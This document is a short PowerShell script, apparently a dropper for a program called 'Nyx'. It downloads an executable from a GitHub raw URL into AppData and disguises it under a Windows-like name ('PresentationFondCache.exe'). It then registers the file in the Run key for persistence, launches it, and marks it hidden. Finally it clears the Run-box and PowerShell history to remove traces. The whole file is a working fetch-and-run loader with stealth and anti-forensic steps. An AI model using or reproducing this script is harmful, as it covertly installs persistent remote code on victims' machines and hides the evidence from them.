# Nyx - SWLWFG6Z

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "SWLWFG6Z" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/SWLWFG6Z/SWLWFG6Z.exe -OutFile "$env:APPDATA\SWLWFG6Z\SWLWFG6Z.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\SWLWFG6Z\SWLWFG6Z.exe" -NewName "PresentationFondCache.exe"

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "SWLWFG6Z" `
-Value "$env:APPDATA\SWLWFG6Z\PresentationFondCache.exe"

# Run Nyx
& "$env:APPDATA\SWLWFG6Z\PresentationFondCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\SWLWFG6Z\PresentationFondCache.exe" -Force
$FILE.attributes='Hidden'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
